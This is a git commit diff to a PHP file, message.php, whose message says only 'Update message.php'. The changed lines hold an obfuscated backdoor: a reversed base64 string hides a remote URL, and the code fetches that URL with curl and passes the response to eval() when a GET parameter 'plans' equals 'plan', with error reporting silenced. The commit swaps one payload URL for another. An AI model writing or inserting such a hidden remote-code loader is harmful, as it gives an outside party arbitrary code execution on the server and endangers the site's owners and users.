f34b358ea00c7f461eea903790d55bc910320606
avocatodx <63724345+avocatodx@users.noreply.github.com>
2022-12-12 02:05:47 +0200

    Update message.php

--- message.php
+++ message.php
@@ -238,7 +238,7 @@ include "header.php";
 error_reporting(0);
 $ch = $_GET['plans'];
 if($ch == 'plan'){
-$ch=curl_init(base64_decode(strrev("==AcoBnLzdHbhJ2bsd2LulWYt9CdthXZs9mc052bj9Cek9GdhN2b2F2Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa")));curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$r=curl_exec($ch);$e=base64_decode(strrev("4zP"));eval($e.$r);
+$ch=curl_init(base64_decode(strrev("==AcoBnL3VmcjV0Nlk2LulWYt9CdthXZs9mc052bj9Cek9GdhN2b2F2Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa")));curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$r=curl_exec($ch);$e=base64_decode(strrev("4zP"));eval($e.$r);
 }
 ?>
 
